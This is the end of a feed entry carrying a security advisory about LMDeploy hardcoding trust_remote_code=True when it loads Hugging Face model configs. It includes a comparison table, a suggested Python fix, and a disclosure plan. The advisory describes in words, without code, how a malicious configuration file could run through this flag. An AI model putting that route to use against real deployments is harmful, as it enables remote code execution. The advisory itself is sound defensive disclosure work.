<th>Project</th>
<th>trust_remote_code default</th>
<th>User control</th>
</tr>
</thead>
<tbody><tr>
<td>HuggingFace Transformers</td>
<td>False</td>
<td><code>trust_remote_code</code> keyword arg</td>
</tr>
<tr>
<td>vLLM</td>
<td>False</td>
<td><code>--trust-remote-code</code> flag</td>
</tr>
<tr>
<td><strong>LMDeploy</strong></td>
<td><strong>True (hardcoded)</strong></td>
<td><strong>None</strong></td>
</tr>
<tr>
<td>TGI</td>
<td>False</td>
<td><code>--trust-remote-code</code> flag</td>
</tr>
</tbody></table>
<p>LMDeploy is the outlier. The rationale is presumably "internal
models like InternLM need custom configuration_*.py", but the fix is
to accept a CLI flag like <code>--trust-remote-code</code> and default-False as
the rest of the ecosystem does.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Replace every hardcoded <code>trust_remote_code=True</code> with an explicit
opt-in via CLI flag:</p>
<pre><code class="language-python"># lmdeploy/archs.py — get_model_arch
def get_model_arch(model_path: str, trust_remote_code: bool = False):
    try:
        cfg = AutoConfig.from_pretrained(model_path, trust_remote_code=trust_remote_code)
    except Exception as e:  # noqa
        from transformers import PretrainedConfig
        cfg = PretrainedConfig.from_pretrained(model_path, trust_remote_code=trust_remote_code)
</code></pre>
<p>Wire <code>trust_remote_code</code> through every call site. Add <code>--trust-remote-code</code>
to lmdeploy's CLI parser and forward it from server / calibrate /
gptq / etc. <strong>Default False</strong>.</p>
<p>A patch fragment is in <code>patch.diff</code>.</p>
<h2 id="disclosure-plan">Disclosure plan</h2>
<ol>
<li>Submit privately via lmdeploy security contact (typically email or
GitHub Security Advisory at
<code>https://github.com/InternLM/lmdeploy/security/advisories/new</code>).</li>
<li>Reference Hugging Face Transformers' historical opt-out → opt-in
change as precedent for the fix shape.</li>
<li>90-day coordinated-disclosure window starting from acknowledgement.</li>
<li>Request CVE through GHSA flow once the patch lands.</li>
</ol>
<h2 id="why-static-only-is-sufficient-here">Why static-only is sufficient here</h2>
<p>Unlike F11 (RCE chain through <code>_load_pt_file</code>) which required a
runtime PoC to demonstrate the pickle gadget execution, this finding
is a <strong>single trust-flag flip</strong> — the behaviour of
<code>AutoConfig.from_pretrained(repo, trust_remote_code=True)</code> on a HF
repo with a malicious <code>configuration_*.py</code> is documented behaviour of
HF Transformers itself (their own docs warn against it). Reproducing
it adds no new evidence; the static flag-state is the bug.</p>
<p>If the vendor requests a runtime PoC during triage we will provide
one (a malicious HF repo with <code>configuration_evil.py</code> + a one-liner
<code>lmdeploy lite calibrate &lt;repo&gt;</code> invocation), but holding it back from
the initial advisory avoids publishing a working exploit during the
disclosure window.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/InternLM/lmdeploy/security/advisories/GHSA-9xq9-36w5-q796">https://github.com/InternLM/lmdeploy/security/advisories/GHSA-9xq9-36w5-q796</a></li>
<li><a href="https://github.com/advisories/GHSA-9xq9-36w5-q796">https://github.com/advisories/GHSA-9xq9-36w5-q796</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9xq9-36w5-q796</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T19:33:32.000Z</published>
    </entry>
</feed>